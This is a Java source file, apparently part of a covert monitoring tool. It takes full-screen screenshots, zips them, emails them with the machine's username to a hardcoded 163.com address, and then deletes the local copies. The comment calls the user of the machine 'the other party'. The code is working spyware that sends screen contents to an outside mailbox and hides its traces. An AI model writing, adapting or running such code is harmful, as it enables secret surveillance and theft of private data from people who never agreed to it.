package com.lyx;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.util.ZipUtil;
import cn.hutool.extra.mail.MailUtil;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;

public class ScreenSnap
{
	// 图片存储目录,最后带一个 /
	public static final String PIC_IDR_PATH = FileUtil.getUserHomePath() + File.separator + "snap" + File.separator;

	/**
	 * 发送邮件并删除生成的文件
	 */
	public static void sendEmailAndDelFile()
	{
		// 将 snap 目录压缩
		File zip = ZipUtil.zip(PIC_IDR_PATH);

		// 发送邮件
		String send = MailUtil.send("name_Lyx@163.com", "对方账户名: "+System.getProperties().get("user.name"), "屏幕快照 " + DateUtil.now(), false, zip);

		// 删除文件
		FileUtil.del(zip);
		FileUtil.del(PIC_IDR_PATH);
	}

	/**
	 * 拍摄屏幕快照
	 */
	public static void snap()
	{
		if (!FileUtil.exist(PIC_IDR_PATH))
			FileUtil.mkdir(PIC_IDR_PATH);

		try
		{
			String picPath = PIC_IDR_PATH + DateUtil.now() + ".jpg";

			Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
			BufferedImage screenshot = (new Robot()).createScreenCapture(new Rectangle(0, 0, (int) d.getWidth(), (int) d.getHeight()));

			ImageIO.write(screenshot, "jpg", FileUtil.file(picPath));
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
}